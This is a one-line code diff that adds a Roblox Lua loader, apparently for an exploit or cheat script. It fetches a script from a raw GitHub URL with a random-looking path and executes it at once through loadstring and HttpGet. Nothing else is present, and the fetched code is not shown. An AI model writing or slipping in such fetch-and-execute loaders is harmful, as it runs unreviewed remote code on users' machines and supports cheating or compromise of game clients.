@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ato114514/ato/main/gageiwmsbsialsnshoamsvsuakbshswisnhaiwnsgsikabwysisjabgwosksbayqoskbzyaodjdbgaowldnvztispqlwk%20qjabsuqojjsbshwojqbqgwisosmbd"))()
